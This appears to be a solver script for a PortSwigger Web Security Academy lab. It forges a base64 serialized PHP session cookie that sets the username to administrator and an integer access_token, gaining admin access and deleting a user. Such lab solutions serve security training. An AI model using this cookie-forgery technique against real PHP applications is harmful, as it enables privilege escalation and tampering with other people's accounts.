# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types
# Lab: Modifying serialized data types
# DIFFICULTY: PRACTITIONER

import requests, base64
from pwn import log
from urllib.parse import unquote

sub = '0a9e00a304d4d2f881511c9800fb0066'
url = f'https://{sub}.web-security-academy.net'

s = requests.session()

def login():
    r = s.post(f'{url}/login', data={'username': 'wiener', 'password': 'peter'})
    log.info(f'Logging in as wiener: {r.status_code}')
    
def exploit():
    session_cookie = s.cookies.get('session')
    log.info(f'Cookie is serialized PHP object: {base64.b64decode(unquote(session_cookie))}')
    
    # Change username to administrator
    # Change access_token to integer with value 0
    # O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
    s.cookies.set('session', 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9')
    
    # Delete the user 'carlos'
    r = s.get(f'{url}/admin/delete?username=carlos')
    
    if r.status_code != 200:
        log.error('Failed to delete user carlos')
        return
    log.success('Deleted user carlos')
    
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')
    
if __name__ == '__main__':
    login()
    exploit()